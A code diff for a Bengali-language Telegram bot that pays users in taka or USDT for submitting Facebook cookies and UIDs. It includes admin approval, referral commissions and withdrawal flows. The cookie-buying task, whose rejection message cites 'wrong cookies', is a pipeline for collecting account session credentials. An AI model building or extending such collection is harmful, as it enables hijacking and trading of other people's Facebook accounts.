+            if data == "fb_approve":
+                await query.edit_message_text(text=f"{base_text}\n\nStatus: APPROVED ✅")
+                add_user_balance(target_user_id, reward)
+                update_user_field(target_user_id, "completed_tasks", user_data["completed_tasks"] + 1)
+                update_user_field(target_user_id, "review_tasks", max(0, user_data["review_tasks"] - 1))
+                
+                # রেফারেল কমিশন (১৫%)
+                if user_data["referred_by"]:
+                    ref_id = user_data["referred_by"]
+                    commission = reward * 0.15
+                    add_user_balance(ref_id, commission)
+                    ref_user_data = get_user(ref_id)
+                    update_user_field(ref_id, "refer_income", ref_user_data["refer_income"] + commission)
+                    try:
+                        await context.bot.send_message(chat_id=ref_id, text=f"🎁 আপনার রেফারেল থেকে নতুন কমিশন যুক্ত হয়েছে: +৳{commission:.2f}")
+                    except:
+                        pass
+
+                try:
+                    await context.bot.send_message(chat_id=target_user_id, text=f"💎 ফেসবুক কাজ এপ্রুভ হয়েছে: **+{reward:.2f} BDT** আপনার ব্যালেন্সে যোগ হয়েছে! 😄", parse_mode="Markdown")
+                except:
+                    pass
+
+            elif data == "fb_reject":
+                await query.edit_message_text(text=f"{base_text}\n\nStatus: REJECTED ❌")
+                update_user_field(target_user_id, "review_tasks", max(0, user_data["review_tasks"] - 1))
+                try:
+                    await context.bot.send_message(chat_id=target_user_id, text="🔴 ভুল কুকিজ বা তথ্য সঠিক না থাকায় এই কাজ গ্রহণযোগ্য হয়নি।")
+                except:
+                    pass
+            
+            if message_id in pending_tasks:
+                del pending_tasks[message_id]
+
+async def handle_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("❌ অপারেশন বাতিল করা হয়েছে।")
+    await show_main_menu(update, context)
+    return ConversationHandler.END
+
+def main():
+    init_db()  # ডাটাবেস ইনিশিয়ালাইজেশন
+    app = ApplicationBuilder().token("YOUR_BOT_TOKEN_HERE").build()
+
+    # ফেসবুক কুকিজ কনভারসেশন
+    fb_conv = ConversationHandler(
+        entry_points=[MessageHandler(filters.Text("✔ UID দিন"), ask_for_fb_cookies)],
+        states={WAITING_FOR_FB_COOKIES: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_fb_cookies)]},
+        fallbacks=[MessageHandler(filters.Text("❌ বাতিল"), handle_cancel)]
     )
-    await call.message.edit_text(call.message.text + "\n\n✅ **পেমেন্ট সফলভাবে সম্পন্ন হয়েছে।**")
-    await call.answer()
 
-@dp.callback_query_handler(text_startswith="w_rej_")
-async def admin_withdraw_reject(call: types.CallbackQuery):
-    parts = call.data.split("_")
-    user_id = int(parts[2])
-    min_limit = parts[3]
-    method = parts[4]
+    # উইথড্র কনভারসেশন
+    withdraw_conv = ConversationHandler(
+        entry_points=[
+            MessageHandler(filters.Text("💠 USDT (BEP-20) -> সর্বনিম্ন: 0.25(-0.05)"), ask_for_withdraw_account),
+            MessageHandler(filters.Text("📱 মোবাইল রিচার্জ -> সর্বনিম্ন: ২৫৳(-৫)"), ask_for_withdraw_account),
+            MessageHandler(filters.Text("📲 বিকাশ -> সর্বনিম্ন: ১১০৳(-১০)"), ask_for_withdraw_account),
+            MessageHandler(filters.Text("🔴 নগদ -> সর্বনিম্ন: ১০০৳(-১০)"), ask_for_withdraw_account)
+        ],
+        states={
+            WAITING_FOR_BKASH_NAGAD_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_withdraw_account)],
+            WAITING_FOR_WITHDRAW_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, finalize_withdrawal)]
+        },
+        fallbacks=[MessageHandler(filters.Text("❌ বাতিল"), handle_cancel)]
+    )
+
+    app.add_handler(CommandHandler("start", start_with_referral))
+    app.add_handler(fb_conv)
+    app.add_handler(withdraw_conv)
     
-    user_balance, _, _ = get_user(user_id)
-
-    if "USDT" in method:
-        await bot.send_message(user_id, f"❌ উইথড্র বাতিল হয়েছে। মিনিমাম উইথড্র {min_limit} USDT。\nআপনার ব্যালেন্স: {user_balance} USDT")
-    else:
-        await bot.send_message(
-            user_id,
-            f"❌ আপনার {method} উইথড্র রিকোয়েস্ট বাতিল করা হয়েছে। পর্যাপ্ত ব্যালেন্স বা সঠিক তথ্য না থাকায় এটি রিজেক্ট করা হয়।"
-        )
-
-    await call.message.edit_text(call.message.text + "\n\n❌ **উইথড্র রিকোয়েস্ট বাতিল করা হয়েছে।**")
-    await call.answer()
-
-
-# ---------------------------------------------------------
-# অন্যান্য মেনু বা বাটন হ্যান্ডলার (Placeholder)
-# ---------------------------------------------------------
-@dp.message_handler(text=["🎁 My Referrals", "☎️ সাপোর্ট", "👶 আমি নতুন"])
-async def other_menu_handlers(message: types.Message):
-    if message.text == "🎁 My Referrals":
-        await message.reply("🎁 আপনার রেফারেল লিংক থেকে বন্ধুরা জয়েন করলে বোনাস পাবেন!")
-    elif message.text == "☎️ সাপোর্ট":
-        await message.reply("☎️ কোনো সমস্যায় অ্যাডমিনের সাথে যোগাযোগ করুন।")
-    elif message.text == "👶 আমি নতুন":
-        await message.reply("👶 কীভাবে কাজ করবেন তার নির্দেশিকা এখানে দেওয়া হলো...")
-
-
-# ---------------------------------------------------------
-# মূল এন্ট্রি পয়েন্ট (ফ্লাস্ক থ্রেড + এআইওগ্রাম পোলিং)
-# ---------------------------------------------------------
-if __name__ == '__main__':
-    # ফ্লাস্ক সার্ভার ব্যাকগ্রাউন্ড থ্রেডে চালু করা হচ্ছে
-    flask_thread = threading.Thread(target=run_flask)
-    flask_thread.daemon = True
-    flask_thread.start()
+    app.add_handler(MessageHandler(filters.Text("📋 কাজ ▶"), handle_tasks_menu))
+    app.add_handler(MessageHandler(filters.Text("💰 ব্যালেন্স"), check_balance))
+    app.add_handler(MessageHandler(filters.Text("🎁 My Referrals"), handle_referral_menu))
+    app.add_handler(MessageHandler(filters.Text("🔙 ফিরে যান"), handle_tasks_menu))
+    app.add_handler(MessageHandler(filters.Text("f Facebook কাজ"), handle_facebook_tasks))
+    app.add_handler(MessageHandler(filters.Text("✉️ Anymail/Number"), handle_anymail_tasks))
+    app.add_handler(MessageHandler(filters.Text("f 0 fnd cookies | 4.00 ৳"), handle_specific_facebook_details))
+    app.add_handler(MessageHandler(filters.Text("💵 টাকা উত্তোলন"), handle_withdraw_menu))
+    app.add_handler(MessageHandler(filters.Text("❌ বাতিল"), handle_cancel))
     
-    logging.info("Starting bot polling and Flask server...")
+    app.add_handler(CallbackQueryHandler(admin_decision_callback))
 
-    # aiogram পোলিং শুরু করা হচ্ছে
-    executor.start_polling(dp, skip_updates=True)
+    print("বট সফলভাবে চালু হয়েছে এবং ডাটাবেস কানেক্ট হয়েছে...")
+    app.run_polling()
+
+if __name__ == "__main__":
+    main()
